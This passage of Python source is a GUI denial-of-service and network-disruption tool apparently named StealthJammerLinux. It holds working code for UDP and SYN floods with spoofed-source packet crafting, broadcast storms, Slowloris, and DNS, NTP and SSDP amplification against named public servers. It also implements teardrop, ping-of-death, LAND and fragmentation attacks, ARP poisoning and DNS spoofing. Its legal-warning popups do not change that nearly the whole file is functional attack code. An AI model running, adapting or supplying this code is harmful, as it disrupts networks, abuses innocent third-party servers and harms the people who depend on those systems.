        if entered_code == self.amp_code:
            self.unlock_amplification_attacks()
        else:
            self.amp_failed_attempts += 1
            remaining = 3 - self.amp_failed_attempts
            
            if self.amp_failed_attempts >= 3:
                self.activity_log.insert('1.0', f"[LOCKOUT] Amplification: Maximum attempts exceeded. Restart required.\n", 'error')
                self.amp_unlock_label.config(text="[LOCKED]", foreground='#ff0000')
                self.amp_entry.config(state='disabled', bg='#0a0a0a')
            else:
                self.activity_log.insert('1.0', f"[WARN] Wrong amplification password! {remaining} attempt(s) remaining.\n", 'warning')
                self.amp_entry.config(bg='#330000')
                self.frame.after(200, lambda: self.amp_entry.config(bg='#221100'))
            
            self.amp_entry_var.set("")
    
    def on_dest_entry_change(self, event=None):
        """Handle destructive password entry changes"""
        if self.failed_attempts >= 3:
            self.dest_entry_var.set("")
            return
        
        # Limit to digits only
        current = self.dest_entry_var.get()
        filtered = ''.join(filter(str.isdigit, current))
        if filtered != current:
            self.dest_entry_var.set(filtered)
    
    def check_dest_password(self):
        """Check destructive password"""
        if self.failed_attempts >= 3:
            return
        
        entered = self.dest_entry_var.get()
        if not entered:
            return
        
        entered_code = [int(d) for d in entered]
        
        if entered_code == self.secret_code:
            self.unlock_destructive_attacks()
        else:
            self.failed_attempts += 1
            remaining = 3 - self.failed_attempts
            
            if self.failed_attempts >= 3:
                self.activity_log.insert('1.0', f"[LOCKOUT] Destructive: Maximum attempts exceeded. Restart required.\n", 'error')
                self.unlock_label.config(text="[LOCKED]", foreground='#ff0000')
                self.dest_entry.config(state='disabled', bg='#0a0a0a')
            else:
                self.activity_log.insert('1.0', f"[WARN] Wrong destructive password! {remaining} attempt(s) remaining.\n", 'warning')
                self.dest_entry.config(bg='#330000')
                self.frame.after(200, lambda: self.dest_entry.config(bg='#220000'))
            
            self.dest_entry_var.set("")
    
    def unlock_amplification_attacks(self):
        """Unlock and show amplification attacks"""
        self.amplification_unlocked = True
        self.amp_unlock_label.config(text="[UNLOCKED]", foreground='#00ff00')
        self.amp_entry.config(state='disabled', show="", bg='#001a00')
        self.amp_entry_var.set("UNLOCKED")
        
        # Show warning popup
        messagebox.showwarning("[LEGAL WARNING]", 
                              "[AMPLIFICATION ATTACKS UNLOCKED]\n\n"
                              "These attacks are ILLEGAL:\n"
                              "• Violate computer fraud laws\n"
                              "• Constitute network abuse\n"
                              "• Reflect through innocent 3rd parties\n"
                              "• Can result in criminal prosecution\n\n"
                              "Use ONLY in authorized test environments.\n"
                              "You assume ALL legal responsibility.")
        
        # Show amplification attacks container
        self.amplification_container.pack(fill='x', pady=10)
        
        self.activity_log.insert('1.0', "[WARN] AMPLIFICATION ATTACKS UNLOCKED - Illegal in most jurisdictions!\n", 'warning')
    
    def unlock_destructive_attacks(self):
        """Unlock and show destructive attacks"""
        self.destructive_unlocked = True
        self.unlock_label.config(text="[UNLOCKED]", foreground='#00ff00')
        self.dest_entry.config(state='disabled', show="", bg='#001a00')
        self.dest_entry_var.set("UNLOCKED")
        
        # Show warning popup
        messagebox.showwarning("[WARNING]", 
                              "[DESTRUCTIVE ATTACKS UNLOCKED]\n\n"
                              "These attacks can:\n"
                              "• Crash network devices\n"
                              "• Cause system instability\n"
                              "• Require root privileges\n"
                              "• Violate laws and regulations\n\n"
                              "Use ONLY in authorized test environments.\n"
                              "You assume ALL legal responsibility.")
        
        # Show destructive attacks container
        self.destructive_container.pack(fill='x', pady=10)
        
        self.activity_log.insert('1.0', "[WARN] DESTRUCTIVE ATTACKS UNLOCKED - Use with extreme caution!\n", 'warning')
    
    def on_intensity_changed(self, event):
        """Handle intensity slider change"""
        self.intensity = int(self.intensity_var.get())
        percent = self.intensity * 10
        self.intensity_label.config(text=f"Level {self.intensity} ({percent}%)")
        # Switch to custom mode when user adjusts settings
        self.set_custom_mode()
    
    def on_attack_toggle(self):
        """Toggle attack on/off"""
        if not self.attack_active:
            self.start_attack()
        else:
            self.stop_attack()
    
    def start_attack(self):
        """Start the attack"""
        self.attack_active = True
        self.start_time = time.time()
        self.packets_sent = 0
        self.bytes_sent = 0
        self.last_packet_count = 0
        self.last_byte_count = 0
        self.last_update_time = time.time()
        
        self.attack_button.config(text="[X] TERMINATE ATTACK", bg='#330000')
        self.status_label.config(text="ATTACKING", foreground=self.danger_color)
        
        self.log_message("=" * 50, "ATTACK")
        self.log_message("ATTACK INITIATED", "ATTACK")
        self.log_message(f"Intensity level: {self.intensity}/10", "ATTACK")
        self.log_message(f"Packet size: {self.packet_size_min}-{self.packet_size_max} bytes", "ATTACK")
        self.log_message(f"Send rate: {self.send_rate} pps/thread", "ATTACK")
        self.log_message(f"Burst size: {self.burst_size} packets", "ATTACK")
        
        self.generate_spoofed_identifiers()
        
        # Preload packets if enabled and not already loaded
        if self.preload_enabled and len(self.preloaded_packets) == 0:
            self.log_message("Auto-preloading packets for attack...", "INFO")
            self._preload_packets_thread()
        
        num_threads = self.intensity * self.thread_multiplier
        
        active_vectors = []
        if self.vector_udp_var.get():
            active_vectors.append("UDP Flood")
            for _ in range(num_threads):
                t = threading.Thread(target=self.udp_flood_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_tcp_var.get():
            active_vectors.append("TCP SYN Flood")
            for _ in range(num_threads):
                if self.syn_flood_raw and self.is_root:
                    t = threading.Thread(target=self.tcp_syn_raw_attack, daemon=True)
                else:
                    t = threading.Thread(target=self.tcp_syn_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_broadcast_var.get():
            active_vectors.append("Broadcast Storm")
            for _ in range(num_threads):
                t = threading.Thread(target=self.broadcast_storm_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_slowloris_var.get():
            active_vectors.append("Slowloris")
            for _ in range(num_threads // 2):  # Fewer threads for connection-based attack
                t = threading.Thread(target=self.slowloris_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        # Bandwidth Saturation (Download Flood)
        if self.vector_download_flood_var.get():
            active_vectors.append("Bandwidth Saturation")
            self.download_flood_active = True
            self.bytes_downloaded = 0
            # Use more threads for maximum bandwidth saturation
            download_threads = num_threads * 3
            for _ in range(download_threads):
                t = threading.Thread(target=self.download_flood_attack, daemon=True)
                t.start()
                self.download_flood_threads.append(t)
            self.log_message(f"[ATTACK] Bandwidth saturation started with {download_threads} download threads", "ATTACK")
        
        # Amplification attacks (require password unlock)
        if self.vector_dns_var.get() and self.amplification_unlocked:
            active_vectors.append("DNS Amplification")
            for _ in range(num_threads):
                t = threading.Thread(target=self.dns_amplification_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_ntp_var.get() and self.amplification_unlocked:
            active_vectors.append("NTP Amplification")
            for _ in range(num_threads):
                t = threading.Thread(target=self.ntp_amplification_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_ssdp_var.get() and self.amplification_unlocked:
            active_vectors.append("SSDP Amplification")
            for _ in range(num_threads):
                t = threading.Thread(target=self.ssdp_amplification_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        # Destructive attacks (require password unlock AND root)
        if self.vector_fragmentation_var.get() and self.destructive_unlocked:
            if self.is_root:
                active_vectors.append("Fragmentation Bomb")
                for _ in range(num_threads):
                    t = threading.Thread(target=self.fragmentation_attack, daemon=True)
                    t.start()
                    self.attack_threads.append(t)
            else:
                self.log_message("[WARN] Fragmentation Bomb requires root privileges", "WARNING")
        
        if self.vector_ping_death_var.get() and self.destructive_unlocked:
            if self.is_root:
                active_vectors.append("Ping of Death")
                for _ in range(num_threads):
                    t = threading.Thread(target=self.ping_of_death_attack, daemon=True)
                    t.start()
                    self.attack_threads.append(t)
            else:
                self.log_message("[WARN] Ping of Death requires root privileges", "WARNING")
        
        if self.vector_land_var.get() and self.destructive_unlocked:
            if self.is_root:
                active_vectors.append("LAND Attack")
                for _ in range(num_threads):
                    t = threading.Thread(target=self.land_attack, daemon=True)
                    t.start()
                    self.attack_threads.append(t)
            else:
                self.log_message("[WARN] LAND Attack requires root privileges", "WARNING")
        
        if self.vector_teardrop_var.get() and self.destructive_unlocked:
            if self.is_root:
                active_vectors.append("Teardrop Attack")
                for _ in range(num_threads):
                    t = threading.Thread(target=self.teardrop_attack, daemon=True)
                    t.start()
                    self.attack_threads.append(t)
            else:
                self.log_message("[WARN] Teardrop Attack requires root privileges", "WARNING")
        
        # Linux-specific attack vectors
        if self.arp_poison_enabled and self.is_root and self.scapy_available:
            active_vectors.append("ARP Poisoning")
            t = threading.Thread(target=self.arp_poison_attack, daemon=True)
            t.start()
            self.attack_threads.append(t)
        
        if self.dns_spoof_enabled and self.is_root and self.scapy_available:
            active_vectors.append("DNS Spoofing")
            t = threading.Thread(target=self.dns_spoof_attack, daemon=True)
            t.start()
            self.attack_threads.append(t)
        
        self.log_message(f"Vectors: {', '.join(active_vectors)}", "ATTACK")
        self.log_message(f"Spawned {len(self.attack_threads)} attack threads", "ATTACK")
        self.log_message(f"Target throughput: {num_threads * self.send_rate:,} pps", "ATTACK")
        self.log_message("=" * 50, "ATTACK")
    
    def stop_attack(self):
        """Stop the attack"""
        self.attack_active = False
        self.download_flood_active = False
        
        self.attack_button.config(text="[>] INITIATE ATTACK", bg='#003300')
        self.status_label.config(text="Idle", foreground=self.warning_color)
        
        self.log_message("=" * 50, "WARNING")
        self.log_message("ATTACK TERMINATED", "WARNING")
        self.log_message(f"Total packets sent: {self.packets_sent:,}", "INFO")
        self.log_message(f"Total data sent: {self.format_bytes(self.bytes_sent)}", "INFO")
        if self.bytes_downloaded > 0:
            self.log_message(f"Total data downloaded: {self.format_bytes(self.bytes_downloaded)}", "INFO")
        self.log_message("=" * 50, "WARNING")
        
        self.attack_threads = []
        self.download_flood_threads = []
    
    def udp_flood_attack(self):
        """UDP flood with preloaded packets - MAXIMUM EFFICIENCY"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)  # 1MB send buffer
            
            preload_index = 0
            
            while self.attack_active:
                try:
                    # Send bursts with no delay for maximum efficiency
                    for _ in range(self.burst_size):
                        if self.preload_enabled and len(self.preloaded_packets) > 0:
                            packet = self.preloaded_packets[preload_index % len(self.preloaded_packets)]
                            sock.sendto(packet['data'], (packet['target'], packet['port']))
                            size = packet['size']
                            preload_index += 1
                        else:
                            port = random.randint(1, 65535)
                            size = random.randint(self.packet_size_min, self.packet_size_max)
                            target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                            
                            payload = bytes(random.getrandbits(8) for _ in range(size))
                            sock.sendto(payload, (target, port))
                        
                        self.packets_sent += 1
                        self.bytes_sent += size
                    # NO DELAY - maximum overload
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def tcp_syn_attack(self):
        """TCP SYN flood - MAXIMUM EFFICIENCY"""
        try:
            while self.attack_active:
                try:
                    # Send bursts with no delay for maximum efficiency
                    for _ in range(self.burst_size):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.001)  # Minimal timeout
                        
                        port = random.randint(1, 65535)
                        target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                        
                        try:
                            sock.connect((target, port))
                        except:
                            pass
                        
                        sock.close()
                        self.packets_sent += 1
                        self.bytes_sent += 60
                    # NO DELAY - maximum overload
                except:
                    pass
        except:
            pass
    
    def tcp_syn_raw_attack(self):
        """Raw TCP SYN flood using raw sockets (Linux only, requires root)"""
        try:
            if not self.is_root:
                return
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
            
            while self.attack_active:
                try:
                    for _ in range(self.burst_size):
                        target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                        port = random.randint(1, 65535)
                        
                        # Craft TCP SYN packet
                        packet = self.craft_tcp_syn(self.spoofed_ip, target, random.randint(1024, 65535), port)
                        sock.sendto(packet, (target, 0))
                        
                        self.packets_sent += 1
                        self.bytes_sent += len(packet)
                    
                    if delay_per_burst > 0:
                        time.sleep(delay_per_burst)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def craft_tcp_syn(self, src_ip, dst_ip, src_port, dst_port):
        """Craft raw TCP SYN packet"""
        # IP header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        # TCP header fields
        tcp_source = src_port
        tcp_dest = dst_port
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        
        # TCP flags
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        # Pack headers
        ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                               ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        
        tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        
        return ip_header + tcp_header
    
    def broadcast_storm_attack(self):
        """Broadcast storm - MAXIMUM EFFICIENCY"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)  # 1MB send buffer
            
            preload_index = 0
            
            while self.attack_active:
                try:
                    # Send bursts with no delay for maximum efficiency
                    for _ in range(self.burst_size):
                        if self.preload_enabled and len(self.preloaded_packets) > 0:
                            packet = self.preloaded_packets[preload_index % len(self.preloaded_packets)]
                            sock.sendto(packet['data'], ("255.255.255.255", packet['port']))
                            size = packet['size']
                            preload_index += 1
                        else:
                            size = random.randint(self.packet_size_min, self.packet_size_max)
                            payload = bytes(random.getrandbits(8) for _ in range(size))
                            port = random.randint(1, 65535)
                            sock.sendto(payload, ("255.255.255.255", port))
                        
                        self.packets_sent += 1
                        self.bytes_sent += size
                    # NO DELAY - maximum overload
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def slowloris_attack(self):
        """Slowloris attack - keeps connections open with partial HTTP headers - MAXIMUM EFFICIENCY"""
        connections = []
        try:
            # Open many more connections for maximum impact
            for _ in range(500):  # 5x more connections
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)  # Faster timeout
                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    sock.connect((target, 80))
                    sock.send(b"GET / HTTP/1.1\r\n")
                    sock.send(f"Host: {target}\r\n".encode())
                    connections.append(sock)
                    self.packets_sent += 1
                    self.bytes_sent += 50
                except:
                    pass
            
            # Keep connections alive with faster updates
            while self.attack_active and connections:
                for sock in connections[:]:
                    try:
                        sock.send(b"X-a: b\r\n")
                        self.packets_sent += 1
                        self.bytes_sent += 10
                    except:
                        connections.remove(sock)
                time.sleep(5)  # Faster keep-alive (was 10s)
        except:
            pass
        finally:
            for sock in connections:
                try:
                    sock.close()
                except:
                    pass
    
    def download_flood_attack(self):
        """Bandwidth saturation - downloads massive amounts of data without storing"""
        import urllib.request
        
        # Large file URLs for bandwidth saturation (use legitimate CDN mirrors)
        download_urls = [
            "http://speedtest.tele2.net/100MB.zip",
            "http://speedtest.tele2.net/10MB.zip",
            "http://ipv4.download.thinkbroadband.com/100MB.zip",
            "http://ipv4.download.thinkbroadband.com/50MB.zip",
            "http://proof.ovh.net/files/100Mb.dat",
            "http://proof.ovh.net/files/10Mb.dat",
            "http://ash-speed.hetzner.com/100MB.bin",
            "http://fsn-speed.hetzner.com/100MB.bin",
        ]
        
        chunk_size = 262144  # 256KB chunks for more efficient downloads
        
        while self.download_flood_active:
            try:
                # Randomly select a download URL
                url = random.choice(download_urls)
                
                # Download without storing
                with urllib.request.urlopen(url, timeout=10) as response:
                    while self.download_flood_active:
                        chunk = response.read(chunk_size)
                        if not chunk:
                            break
                        # Immediately discard the data
                        self.bytes_downloaded += len(chunk)
                        # No delay for maximum bandwidth saturation
            except Exception as e:
                # If download fails, try again with different URL immediately
                time.sleep(0.1)
    
    def dns_amplification_attack(self):
        """DNS amplification attack - reflects through DNS servers"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Public DNS servers to abuse
            dns_servers = [
                "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
                "208.67.222.222", "208.67.220.220"
            ]
            
            # DNS query for ANY record (large response)
            query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + \
                   b'\x03www\x07example\x03com\x00\x00\xff\x00\x01'
            
            while self.attack_active:
                try:
                    dns_server = random.choice(dns_servers)
                    # Spoof source IP to reflect to target
                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    sock.sendto(query, (dns_server, 53))
                    
                    self.packets_sent += 1
                    self.bytes_sent += len(query) * 70  # 70x amplification
                    
                    time.sleep(1 / self.send_rate if self.send_rate > 0 else 0.001)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def ntp_amplification_attack(self):
        """NTP amplification attack - monlist command"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # NTP monlist query
            ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
            
            # Public NTP servers (DO NOT USE IN PRODUCTION)
            ntp_servers = [
                "pool.ntp.org", "time.google.com", "time.cloudflare.com"
            ]
            
            while self.attack_active:
                try:
                    ntp_server = random.choice(ntp_servers)
                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    sock.sendto(ntp_query, (ntp_server, 123))
                    
                    self.packets_sent += 1
                    self.bytes_sent += len(ntp_query) * 556  # 556x amplification
                    
                    time.sleep(1 / self.send_rate if self.send_rate > 0 else 0.001)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def ssdp_amplification_attack(self):
        """SSDP amplification attack - UPnP discovery"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # SSDP M-SEARCH request
            ssdp_request = b'M-SEARCH * HTTP/1.1\r\n' + \
                          b'HOST: 239.255.255.250:1900\r\n' + \
                          b'MAN: "ssdp:discover"\r\n' + \
                          b'MX: 2\r\n' + \
                          b'ST: ssdp:all\r\n\r\n'
            
            while self.attack_active:
                try:
                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    sock.sendto(ssdp_request, (target, 1900))
                    
                    self.packets_sent += 1
                    self.bytes_sent += len(ssdp_request) * 30  # 30x amplification
                    
                    time.sleep(1 / self.send_rate if self.send_rate > 0 else 0.001)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def fragmentation_attack(self):
        """IP Fragmentation bomb - malformed overlapping fragments (requires root)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            
            while self.attack_active:
                try:
                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    
                    # Create malformed IP fragments with overlapping offsets
                    ip_id = random.randint(1, 65535)
                    
                    # Fragment 1
                    frag1 = self.craft_ip_header(target, 8, ip_id, 0x2000, offset=0)
                    frag1 += b'A' * 1000
                    
                    # Fragment 2 - overlaps with fragment 1
                    frag2 = self.craft_ip_header(target, 8, ip_id, 0x2000, offset=50)
                    frag2 += b'B' * 1000
                    
                    # Fragment 3 - final fragment
                    frag3 = self.craft_ip_header(target, 8, ip_id, 0x0000, offset=100)
                    frag3 += b'C' * 500
                    
                    sock.sendto(frag1, (target, 0))
                    sock.sendto(frag2, (target, 0))
                    sock.sendto(frag3, (target, 0))
                    
                    self.packets_sent += 3
                    self.bytes_sent += len(frag1) + len(frag2) + len(frag3)
                    
                    time.sleep(0.1)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def ping_of_death_attack(self):
        """Ping of Death - oversized ICMP packets (requires root)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            while self.attack_active:
                try:
                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    
                    # ICMP echo request header
                    icmp_type = 8  # Echo request
                    icmp_code = 0
                    icmp_checksum = 0
                    icmp_id = random.randint(1, 65535)
                    icmp_seq = 1
                    
                    # Create oversized payload (>65535 bytes when fragmented)
                    payload = b'X' * 65500
                    
                    # Pack ICMP header
                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                    packet = icmp_header + payload
                    
                    # Calculate checksum
                    icmp_checksum = self.calculate_checksum(packet)
                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                    packet = icmp_header + payload
                    
                    sock.sendto(packet, (target, 0))
                    
                    self.packets_sent += 1
                    self.bytes_sent += len(packet)
                    
                    time.sleep(0.1)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def land_attack(self):
        """LAND attack - source IP = destination IP (requires root)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
            while self.attack_active:
                try:
                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    port = random.randint(1, 65535)
                    
                    # Craft TCP SYN packet where source IP = dest IP
                    tcp_header = struct.pack('!HHLLBBHHH',
                        port, port,  # Same source and dest port
                        0, 0,
                        (5 << 4), 2,  # SYN flag
                        8192, 0, 0)
                    
                    # IP header with source = dest
                    ip_header = self.craft_ip_header(target, 6, random.randint(1, 65535), 0, ttl=64, src_ip=target)
                    
                    packet = ip_header + tcp_header
                    sock.sendto(packet, (target, 0))
                    
                    self.packets_sent += 1
                    self.bytes_sent += len(packet)
                    
                    time.sleep(0.1)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def teardrop_attack(self):
        """Teardrop attack - overlapping IP fragments (requires root)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            
            while self.attack_active:
                try:
                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    ip_id = random.randint(1, 65535)
                    
                    # Fragment 1
                    frag1_data = b'A' * 28
                    frag1 = self.craft_ip_header(target, 17, ip_id, 0x2000, offset=0) + frag1_data
                    
                    # Fragment 2 - overlaps with wrong offset
                    frag2_data = b'B' * 28
                    frag2 = self.craft_ip_header(target, 17, ip_id, 0x0000, offset=24) + frag2_data
                    
                    sock.sendto(frag1, (target, 0))
                    sock.sendto(frag2, (target, 0))
                    
                    self.packets_sent += 2
                    self.bytes_sent += len(frag1) + len(frag2)
                    
                    time.sleep(0.1)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def craft_ip_header(self, dest_ip, protocol, ip_id, flags_offset, offset=0, ttl=64, src_ip=None):
        """Craft raw IP header"""
        if src_ip is None:
            src_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
        
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # Kernel will fill
        ip_frag_off = flags_offset | (offset >> 3)
        ip_ttl = ttl
        ip_proto = protocol
        ip_check = 0  # Kernel will fill
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               ip_ihl_ver, ip_tos, ip_tot_len,
                               ip_id, ip_frag_off,
                               ip_ttl, ip_proto, ip_check,
                               ip_saddr, ip_daddr)
        
        return ip_header
    
    def calculate_checksum(self, data):
        """Calculate checksum for ICMP"""
        checksum = 0
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                checksum += (data[i] << 8) + data[i + 1]
            else:
                checksum += data[i] << 8
        
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum = ~checksum & 0xffff
        return checksum
    
    def arp_poison_attack(self):
        """ARP cache poisoning attack (requires scapy and root)"""
        try:
            if not self.scapy_available or not self.is_root:
                return
            
            from scapy.all import ARP, send
            
            while self.attack_active:
                try:
                    # Target random IPs in local subnet
                    target_ip = f"192.168.1.{random.randint(1, 254)}"
                    gateway_ip = "192.168.1.1"  # Common gateway
                    
                    # Craft ARP packets
                    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                psrc=gateway_ip, hwsrc=self.spoofed_mac)
                    
                    send(packet, verbose=False)
                    self.packets_sent += 1
                    self.bytes_sent += 42  # ARP packet size
                    
                    time.sleep(0.1)  # Don't spam too fast
                except:
                    pass
        except:
            pass
    
    def dns_spoof_attack(self):
        """DNS spoofing attack (requires scapy and root)"""
        try:
            if not self.scapy_available or not self.is_root:
                return
            
            from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
            
            while self.attack_active:
                try:
                    # Spoof DNS responses
                    target_ip = f"192.168.1.{random.randint(1, 254)}"
                    
                    # Craft DNS response
                    dns_response = IP(dst=target_ip, src="8.8.8.8") / \
                                  UDP(dport=random.randint(1024, 65535), sport=53) / \
                                  DNS(qr=1, qd=DNSQR(qname="example.com"), 
                                     an=DNSRR(rrname="example.com", rdata=self.spoofed_ip))
                    
                    send(dns_response, verbose=False)
                    self.packets_sent += 1
                    self.bytes_sent += len(bytes(dns_response))
                    
                    time.sleep(0.1)
                except:
                    pass
        except:
            pass
    
    def update_stats(self):
        """Update statistics display"""
        if self.attack_active:
            duration = int(time.time() - self.start_time)
            
            current_time = time.time()
            time_diff = current_time - self.last_update_time
            
            if time_diff >= 1.0:
                packet_diff = self.packets_sent - self.last_packet_count
                byte_diff = self.bytes_sent - self.last_byte_count
                
                self.current_pps = int(packet_diff / time_diff)
                self.current_bandwidth = int(byte_diff / time_diff)
                
                self.last_packet_count = self.packets_sent
                self.last_byte_count = self.bytes_sent
                self.last_update_time = current_time
            
            self.packets_label.config(text=f"{self.packets_sent:,}")
            self.time_label.config(text=f"{duration}s")
            self.rate_label.config(text=f"{self.current_pps:,} pps")
            self.bandwidth_label.config(text=f"{self.format_bytes(self.current_bandwidth)}/s")
            self.data_label.config(text=self.format_bytes(self.bytes_sent))
            self.download_data_label.config(text=self.format_bytes(self.bytes_downloaded))
            self.threads_label.config(text=f"{len(self.attack_threads) + len(self.download_flood_threads)}")
        
        # Update ping
        if self.current_ping >= 0:
            if self.current_ping == 0:
                self.ping_label.config(text="<1 ms", foreground=self.success_color)
            elif self.current_ping < 50:
                self.ping_label.config(text=f"{self.current_ping} ms", foreground=self.success_color)
            elif self.current_ping < 100:
                self.ping_label.config(text=f"{self.current_ping} ms", foreground=self.warning_color)
            else:
                self.ping_label.config(text=f"{self.current_ping} ms", foreground=self.danger_color)
        else:
            self.ping_label.config(text="Timeout", foreground=self.danger_color)
        
        # Update download speed
        if self.current_download_speed > 0:
            speed_text = self.format_bytes(self.current_download_speed) + "/s"
            if self.current_download_speed >= 10_000_000:  # >= 10 MB/s
                self.download_label.config(text=speed_text, foreground=self.success_color)
            elif self.current_download_speed >= 1_000_000:  # >= 1 MB/s
                self.download_label.config(text=speed_text, foreground=self.warning_color)
            else:
                self.download_label.config(text=speed_text, foreground=self.danger_color)
        else:
            self.download_label.config(text="Measuring...", foreground=self.fg_color)
        
        self.frame.after(200, self.update_stats)
    
    def cleanup(self):
        """Cleanup this instance"""
        self.attack_active = False
        self.ping_monitoring = False
        self.download_monitoring = False
        self.download_flood_active = False
        
        # Restore original MAC if changed
        if hasattr(self, 'original_mac') and self.original_mac and hasattr(self, 'current_mac') and self.current_mac != self.original_mac and hasattr(self, 'current_interface') and self.current_interface and self.is_root:
            try:
                subprocess.run(['ip', 'link', 'set', self.current_interface, 'down'], timeout=5)
                subprocess.run(['ip', 'link', 'set', self.current_interface, 'address', self.original_mac], timeout=5)
                subprocess.run(['ip', 'link', 'set', self.current_interface, 'up'], timeout=5)
            except:
                pass

if __name__ == "__main__":
    # Check if running as root, if not, re-launch with sudo
    if os.geteuid() != 0:
        print("[!] This application requires root privileges.")
        print("[*] Relaunching with sudo...")
        try:
            # Re-launch the script with sudo
            args = ['sudo', sys.executable] + sys.argv
            os.execvp('sudo', args)
        except Exception as e:
            print(f"[ERROR] Failed to launch with sudo: {e}")
            sys.exit(1)
    
    # Show warning on startup
    root = tk.Tk()
    root.withdraw()
    
    response = messagebox.askyesno(
        "WARNING - Legal Notice",
        "This tool is designed for authorized security testing only.\n\n"
        "Unauthorized network attacks are ILLEGAL and may result in:\n"
        "• Criminal prosecution\n"
        "• Civil liability\n"
        "• Network disruption\n\n"
        "By clicking 'Yes', you confirm:\n"
        "1. You have explicit authorization to test this network\n"
        "2. You understand the legal implications\n"
        "3. You accept full responsibility for your actions\n\n"
        "Do you wish to continue?",
        icon='warning'
    )
    
    root.destroy()
    
    if response:
        app = StealthJammerLinux()
        app.mainloop()
    else:
        sys.exit(0)
